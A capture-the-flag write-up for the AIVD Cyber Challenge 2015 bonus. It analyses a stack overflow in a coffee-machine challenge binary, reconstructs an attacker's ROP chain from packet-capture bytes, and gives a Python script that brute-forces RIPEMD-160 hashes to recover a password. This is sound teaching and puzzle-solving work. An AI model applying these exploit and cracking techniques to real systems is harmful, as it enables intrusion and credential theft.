# AIVD Cyber Challenge 2015 (BONUS)

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| AIVD Cyber Challenge 2015 | Cyber Challenge (BONUS) | * | - |

**Description:**
>*This writeup concerns the [bonus](challenge/bonus.tar.gz) part of the Dutch General Intelligence and Security Service (AIVD) [cyber challenge](README.md).*

----------
## Write-up

The [bonus archive](challenge/bonus.tar.gz) consists of three files: a README, a traffic capture pcap and an ELF executable. The README is some background story about how someone hacked their coffee machine and changed the password and how the traffic capture shows the attacker playing some kind of 'game' with them:

>```
>Een kwaadaardig sujet is binnengedrongen in onze koffiemachine en heeft het apparaat voorzien van een wachtwoord. Uiteraard hebben we inmiddels wel trek in een bak koffie...
>
>De digitale rekel lijkt goed op de hoogte van de ins-en-outs van onze koffiemachine en probeerde zojuist een of ander obscuur spelletje met ons te spelen; hiervan hebben we een opname weten te verkrijgen. Mogelijk kun je hieruit het wachtwoord achterhalen?
>
>Als je dit wachtwoord meldt tijdens het contact opnemen verdien je extra punten en respect. 
>```

So let's go through the usual motions:

>```bash
>$ file coffee_machine
>coffee_machine; ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
>$ ./coffee_machine 
> 0xC0FF33 Inc. EX-3825
> 
> ** DEBUG CONSOLE ***
> [1] Test brew
> [2] Show system status
> [3] Verify serial integrity
> [4] Dispense tea
> [5] Quit
>$ ./checksec.sh --file ./coffee_machine 
> RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./coffee_machine
>```

Let's load up the binary in IDA and get some pseudocode (annotated and reverse engineered for clarity by us since the binary was stripped after all):

>```c
>int disp_menu()
>{
>  int v0; // eax@1
>  char v2; // [sp+8h] [bp-8h]@0
>
>  v0 = sub_80BE230(0);
>  sub_8097520(v0);
>  output_str((int)"0xC0FF33 Inc. EX-3825\n");
>  output_str((int)"** DEBUG CONSOLE ***");
>  output_str((int)"[1] Test brew");
>  output_str((int)"[2] Show system status");
>  output_str((int)"[3] Verify serial integrity");
>  output_str((int)"[4] Dispense tea");
>  output_str((int)"[5] Quit");
>  while ( 1 )
>  {
>    fprintf(1, (int)"\nYour choice: ", v2);
>    switch ( read_buffer((int)&choice_buffer, 1024) )
>    {
>      default:                                  // invalid option
>        output_str((int)"[x] Invalid choice");
>        return 0;
>      case 5:                                   // quit
>        return 0;
>      case 4:                                   // dispense tea
>        output_str((int)"[!] Are you serious? This is a 0xCOFF33 machine!1!");
>        continue;
>      case 3:                                   // verify serial integrity
>        verify_serial();
>        break;
>      case 2:                                   // show system status
>        show_systemstatus();
>        break;
>      case 1:                                   // test brew
>        output_str((int)"   ( (\n    ) )\n  ........\n  |      |]\n  \\      /\n   `----'");
>        break;
>    }
>  }
>}
>
>int verify_serial()
>{
>  int to_read; // eax@1
>  int read_byte_count; // edx@1
>  char v3; // [sp+10h] [bp-1Ch]@1 28-byte buffer
>
>  output_str((int)"[?] Number of trust bytes?");
>  to_read = read_buffer((int)&v3, 2048);        
>  read_byte_count = 0xF;
>  if ( (unsigned int)to_read <= 0xF )
>    read_byte_count = to_read;
>  return disclose_bytes((int)"EX3825AQ3E8F5CD", read_byte_count);
>}
>
>int __cdecl disclose_bytes(int keyword, int byte_count)
>{
>  char hashdigest; // [sp+1Ch] [bp-20h]@1
>
>  fprintf(1, (int)"[i] Okay, %d bytes coming up\n", byte_count);
>  hash(keyword, byte_count, (int)&hashdigest);
>  return display_hexdigest((int)&hashdigest, 20);
>}
>
>int __cdecl hash(int keyword, int byte_count, int hashdigest)
>{
>  int result; // eax@3
>  int hash_context; // [sp+52Ch] [bp-ECh]@1
>  int v5; // [sp+530h] [bp-E8h]@1
>  int v6; // [sp+534h] [bp-E4h]@1
>  unsigned int v7; // [sp+538h] [bp-E0h]@1
>  unsigned int v8; // [sp+53Ch] [bp-DCh]@1
>  int v9; // [sp+540h] [bp-D8h]@1
>  unsigned int v10; // [sp+544h] [bp-D4h]@1
>  int v11; // [sp+608h] [bp-10h]@1
>
>  v11 = *MK_FP(__GS__, 20);
>  hash_context = 0;
>  v5 = 0;
>  v6 = 0x67452301;                              // default seed values (init state)
>  v7 = 0xEFCDAB89;
>  v8 = 0x98BADCFE;
>  v9 = 0x10325476;
>  v10 = 0xC3D2E1F0;
>  if ( byte_count )
>    Digest_Update((int)&hash_context, keyword, byte_count);
>  Digest_Final((int)&hash_context, hashdigest);
>  memset(&hash_context, 0, 0xDCu);
>  result = *MK_FP(__GS__, 20) ^ v11;
>  if ( *MK_FP(__GS__, 20) != v11 )
>    sub_80C7640();
>  return result;
>}
>```

Now let's look at what the attacker has been doing. The PCAP contains a single TCP stream:

>```
>0xC0FF33 Inc. EX-3825
>
>** DEBUG CONSOLE ***
>[1] Test brew
>[2] Show system status
>[3] Verify serial integrity
>[4] Dispense tea
>[5] Quit
>
>Your choice: 1 SHALL
>   ( (
>    ) )
>  ........
>  |      |]
>  \      /
>   `----'
>
>Your choice: 4 WE
>[!] Are you serious? This is a 0xCOFF33 machine!1!
>
>Your choice: 2 PLAY
>[i] Coffee: 2493 g
>[i] Sugar: 493 g
>[i] Milk: 832 mL
>[i] Boiler temp: 92 C
>
>Your choice: 1 A
>   ( (
>    ) )
>  ........
>  |      |]
>  \      /
>   `----'
>
>Your choice: 3 GAME?/tmp/password.
>[?] Number of trust bytes?
>5 AAAAAAAAAAAAAAAAAAAAAAAAAA.N..<P......@...PP..<P...........Q..;P..................<P..............<P..............<P..............<P......
>.......<P..............<P..............<P..............<P..............<P..............<P..............<P..............<P..............<P...........s..
>[i] Okay, 5 bytes coming up
>38fd30d7441a1bd1490a2ba91f0e4a73495640d7
>[i] Okay, 7 bytes coming up
>7b4ceb50c1bb181033dc4dd0080b1ddc98b46f29
>[i] Okay, 9 bytes coming up
>66702342d69133a92d303edc497115642aa995f8
>[i] Okay, 11 bytes coming up
>3c5008ab11ce269c2412536e53008aabf7246a4e
>[i] Okay, 13 bytes coming up
>8f466d257e3cc71b0a2b355fa0bb1e16a8aa5ead
>[i] Okay, 15 bytes coming up
>c18428c4ac0295f605acd953d0c0490a4b22a51c
>[i] Okay, 17 bytes coming up
>38ada7dc4355a76351affe64657450d347e10349
>[i] Okay, 19 bytes coming up
>ffe4582900b994a3863d96775fd1964c80fa6392
>[i] Okay, 21 bytes coming up
>cf0fdb641b0df6ec6231efc142891c92986178dc
>[i] Okay, 23 bytes coming up
>c5f6aba5c5ddb6fc30aa1a20a96dac5cc6a88677
>[i] Okay, 25 bytes coming up
>16ed8ef5a657bc26bfeeaa4a30bed8b76a128c4e
>[i] Okay, 27 bytes coming up
>16d5826bebc39b70b9e12529d50fef09c938d001
>[i] Okay, 29 bytes coming up
>43cdb8c07847f1087da7e611125afc1ffa801ad9
>[i] Okay, 31 bytes coming up
>0fe5cf679ef26ab27b1e5bbb6b4176d67e4c154e
>```

Option number 3 ("Verify serial integrity" which calls verify_serial) usually only displays a single hash of up to at most 15 bytes of the hardcoded password (which is "EX3825AQ3E8F5CD" in our case). But if we look closely at that function we can see it's vulnerable to a trivial stack overflow:

>```c
>int verify_serial()
>{
>  int to_read; // eax@1
>  int read_byte_count; // edx@1
>  char v3; // [sp+10h] [bp-1Ch]@1 28-byte buffer
>
>  output_str((int)"[?] Number of trust bytes?");
>  to_read = read_buffer((int)&v3, 2048);        
>  read_byte_count = 0xF;
>  if ( (unsigned int)to_read <= 0xF )
>    read_byte_count = to_read;
>  return disclose_bytes((int)"EX3825AQ3E8F5CD", read_byte_count);
>}
>```

read_buffer allows the client to send up to 2048 bytes in a 28 byte buffer hence leading to a stack overflow that the attacker clearly exploited if we look at their packet (26 filler bytes plus two ("5 ") make 28 bytes until saved return address):

>```
>0000   35 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41  5 AAAAAAAAAAAAAA
>0010   41 41 41 41 41 41 41 41 41 41 41 41 10 4e 0b 08  AAAAAAAAAAAA.N..
>0020   3c 50 10 08 00 d9 16 08 40 93 11 08 50 50 0c 08  <P......@...PP..
>0030   3c 50 10 08 c7 d8 16 08 00 00 00 00 b0 51 0c 08  <P...........Q..
>0040   3b 50 10 08 03 00 00 00 08 d9 16 08 17 00 00 00  ;P..............
>0050   90 93 04 08 3c 50 10 08 00 d9 16 08 07 00 00 00  ....<P..........
>0060   90 93 04 08 3c 50 10 08 00 d9 16 08 09 00 00 00  ....<P..........
>0070   90 93 04 08 3c 50 10 08 00 d9 16 08 0b 00 00 00  ....<P..........
>0080   90 93 04 08 3c 50 10 08 00 d9 16 08 0d 00 00 00  ....<P..........
>0090   90 93 04 08 3c 50 10 08 00 d9 16 08 0f 00 00 00  ....<P..........
>00a0   90 93 04 08 3c 50 10 08 00 d9 16 08 11 00 00 00  ....<P..........
>00b0   90 93 04 08 3c 50 10 08 00 d9 16 08 13 00 00 00  ....<P..........
>00c0   90 93 04 08 3c 50 10 08 00 d9 16 08 15 00 00 00  ....<P..........
>00d0   90 93 04 08 3c 50 10 08 00 d9 16 08 17 00 00 00  ....<P..........
>00e0   90 93 04 08 3c 50 10 08 00 d9 16 08 19 00 00 00  ....<P..........
>00f0   90 93 04 08 3c 50 10 08 00 d9 16 08 1b 00 00 00  ....<P..........
>0100   90 93 04 08 3c 50 10 08 00 d9 16 08 1d 00 00 00  ....<P..........
>0110   90 93 04 08 3c 50 10 08 00 d9 16 08 1f 00 00 00  ....<P..........
>0120   00 73 09 08 0a                                   .s...
>```

Since the application has a non-exec stack the attacker had to build a ROP-chain which is clear from the sequence of DWORDs (all of which are valid addresses in our binary) following the filler buffer. Running the program in gdb confirms this:

>```
>0xC0FF33 Inc. EX-3825
>
>** DEBUG CONSOLE ***
>[1] Test brew
>[2] Show system status
>[3] Verify serial integrity
>[4] Dispense tea
>[5] Quit
>
>Your choice: 3
>[?] Number of trust bytes?
>5 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>[i] Okay, 5 bytes coming up
>38fd30d7441a1bd1490a2ba91f0e4a73495640d7
>
>Program received signal SIGSEGV, Segmentation fault.
>0x41414141 in ?? ()
>```

Let's reproduce the exploit by extracting the ROP chain from the attacker's packet and reverse-engineering the ROP gadgets:

>```
>We can extract the following ROP-chain:
>
>0x80b4e10 ; function that finds terminating null-byte
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1 (located in choice_buffer 0x816D8C0. choice_buffer[64: ])
>0x8119340 ; address of password
>0x80c5050 ; some function who cares
>0x810503c ; pop esi/pop edi/ret
>0x816d8c7 ; .bss var2 (located in choice_buffer 0x816D8C0. choice_buffer[7: ])
>0x0000
>0x80c51b0 ; some other function who cares
>0x810503b ; pop ebx/pop esi/pop edi/ret
>0x0003
>0x816d908 ; .bss var3 (located in choice_buffer 0x816D8C0. choice_buffer[72: ])
>0x0017
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x0007
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x0009
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x000b
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x000d
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x000f
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x0011
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x0013
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x0015
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x0017
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x0019
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x001b
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x001d
>0x8049390 ; disclose_bytes(keyword, byte_count)
>0x810503c ; pop esi/pop edi/ret
>0x816d900 ; .bss var1
>0x001f
>0x8097300
>```

As we can see the ROP chain does some initialization and subsequently discloses hashes of increasingly large fragments of the password. We can run the [repurposed exploit](solution/coffee_exploit.py) against our own instance of the binary:

>```bash
>$ ./coffee_exploit.py | ./coffee_machine
>0xC0FF33 Inc. EX-3825
>
>** DEBUG CONSOLE ***
>[1] Test brew
>[2] Show system status
>[3] Verify serial integrity
>[4] Dispense tea
>[5] Quit
>
>Your choice: [?] Number of trust bytes?
>[i] Okay, 5 bytes coming up
>38fd30d7441a1bd1490a2ba91f0e4a73495640d7
>[i] Okay, 7 bytes coming up
>7b4ceb50c1bb181033dc4dd0080b1ddc98b46f29
>[i] Okay, 9 bytes coming up
>10e876743865f61bd215b1195586c0d2365e99cb
>[i] Okay, 11 bytes coming up
>218acbbd133e9281ec3aa9de26809e05e6d2728a
>[i] Okay, 13 bytes coming up
>aea2f9955dd4b19aea581754dfa6fe19c015be11
>[i] Okay, 15 bytes coming up
>e1ae7f909d5501637ae69c60ed38012f39803ee1
>[i] Okay, 17 bytes coming up
>e66e6ba0a9d96901e3e6c172ad778736c54ed1f5
>[i] Okay, 19 bytes coming up
>718f8de4312fb8e3806ae1529b47c79e19d70ff7
>[i] Okay, 21 bytes coming up
>c3309fe81c9f2a0a9e7d3ece6ecb617fd6fa4b15
>[i] Okay, 23 bytes coming up
>18a943d2a326ee21228d25ef0e565060a2ec10be
>[i] Okay, 25 bytes coming up
>e8a677fa3b96a9eb895a62cbc2648cd26a87d10c
>[i] Okay, 27 bytes coming up
>4138195a180f1c9923c4585f91ad12df90a10930
>[i] Okay, 29 bytes coming up
>26c3bd12a6cc2b53e7cc46b88fd4b4ba16d5e667
>[i] Okay, 31 bytes coming up
>998b5465fb296c6ece2afe86fc160292a4e7bf32
>```

As we can see except for the hash of the first 5 bytes the subsequent hashes differ from those in the attacker traffic PCAP which makes sense because they changed the password. So in order to obtain the password we can take the hashes in the PCAP and iteratively crack them 2-bytes-at-a-time to obtain the password. All that's left to do is determine the hashing algorithm used which we'll do without reverse engineering the entire stripped code:

>```c
>int __cdecl hash(int keyword, int byte_count, int hashdigest)
>{
>  int result; // eax@3
>  int hash_context; // [sp+52Ch] [bp-ECh]@1
>  int v5; // [sp+530h] [bp-E8h]@1
>  int v6; // [sp+534h] [bp-E4h]@1
>  unsigned int v7; // [sp+538h] [bp-E0h]@1
>  unsigned int v8; // [sp+53Ch] [bp-DCh]@1
>  int v9; // [sp+540h] [bp-D8h]@1
>  unsigned int v10; // [sp+544h] [bp-D4h]@1
>  int v11; // [sp+608h] [bp-10h]@1
>
>  v11 = *MK_FP(__GS__, 20);
>  hash_context = 0;
>  v5 = 0;
>  v6 = 0x67452301;                              // default seed values (init state)
>  v7 = 0xEFCDAB89;
>  v8 = 0x98BADCFE;
>  v9 = 0x10325476;
>  v10 = 0xC3D2E1F0;
>  if ( byte_count )
>    Digest_Update((int)&hash_context, keyword, byte_count);
>  Digest_Final((int)&hash_context, hashdigest);
>  memset(&hash_context, 0, 0xDCu);
>  result = *MK_FP(__GS__, 20) ^ v11;
>  if ( *MK_FP(__GS__, 20) != v11 )
>    sub_80C7640();
>  return result;
>}
>```

Given that all hashes are 40 hex characters (and hence 160 bit digests) there are a couple of possible candidates:

* SHA-0 (as if lol)
* SHA-1
* HAVAL-160
* RIPEMD-160
* Tiger-160
* Etc.

If we look at the source we see the following:

>```
>v6 = 0x67452301;                              
>v7 = 0xEFCDAB89;
>v8 = 0x98BADCFE;
>v9 = 0x10325476;
>v10 = 0xC3D2E1F0;
>```

Which are the default seed values to SHA-1, RIPEMD-160, etc. We know the password in our binary is EX3825AQ3E8F5CD and hence if we specify to disclose 15 bytes we get:

>```
>Your choice: 3
>[?] Number of trust bytes?
>15
>[i] Okay, 15 bytes coming up
>e1ae7f909d5501637ae69c60ed38012f39803ee1
>```

Given that:

* sha1("EX3825AQ3E8F5CD") = 93f37ab772ecbc904cca9883cdf62550a1e87bca
* ripemd160("EX3825AQ3E8F5CD") = e1ae7f909d5501637ae69c60ed38012f39803ee1

We now know the hash used is RIPEMD160 and we can write [a brute-force solution](solution/ripe_crack.py) for cracking the hashes contained in the attacker traffic:

>```python
>#!/usr/bin/env python
>#
># AIVD Cyber Challenge 2015 (BONUS)
>#
># @a: Smoke Leet Everyday
># @u: https://github.com/smokeleeteveryday
>#
>
>import hashlib
>import itertools
>import string
>
>def ripemd160(indata):
>	h = hashlib.new('ripemd160')
>	h.update(indata)
>	return h.hexdigest()
>
>def brute(prefix, crack_len, target):
>	# lower+upper alphanumeric
>	charset = string.letters + string.digits
>
>	for p in itertools.chain.from_iterable((''.join(l) for l in itertools.product(charset, repeat=i)) for i in range(crack_len, crack_len + 1)):
>		if(ripemd160(prefix + p) == target):
>			return prefix + p
>	return ""
>
>leak_fragments = [(5, "38fd30d7441a1bd1490a2ba91f0e4a73495640d7"),
>(7, "7b4ceb50c1bb181033dc4dd0080b1ddc98b46f29"),
>(9, "66702342d69133a92d303edc497115642aa995f8"),
>(11, "3c5008ab11ce269c2412536e53008aabf7246a4e"),
>(13, "8f466d257e3cc71b0a2b355fa0bb1e16a8aa5ead"),
>(15, "c18428c4ac0295f605acd953d0c0490a4b22a51c"),
>(17, "38ada7dc4355a76351affe64657450d347e10349"),
>(19, "ffe4582900b994a3863d96775fd1964c80fa6392"),
>(21, "cf0fdb641b0df6ec6231efc142891c92986178dc"),
>(23, "c5f6aba5c5ddb6fc30aa1a20a96dac5cc6a88677"),
>(25, "16ed8ef5a657bc26bfeeaa4a30bed8b76a128c4e"),
>(27, "16d5826bebc39b70b9e12529d50fef09c938d001"),
>(29, "43cdb8c07847f1087da7e611125afc1ffa801ad9"),
>(31, "0fe5cf679ef26ab27b1e5bbb6b4176d67e4c154e")]
>
># We know the first 5 bytes because they match the ones output by our binary
>password = "EX382"
>for fragment in leak_fragments:
>	password = brute(password, fragment[0] - len(password), fragment[1])
>
>	if(password == ""):
>		raise Exception("[-]Couldn't crack (%d, %s) :(" % (fragment[0], fragment[1]))
>
>print "[+]Got password: [%s]!" % password
>```

Which gives us:

>```bash
>$ ./ripe_crack.py
>[+]Got password: [EX3825AQiamziltoidtheomniscient]!
>```

The bonus password thus being "iamziltoidtheomniscient" (a reference to an album by Devin Townsend of Strapping Young Lad)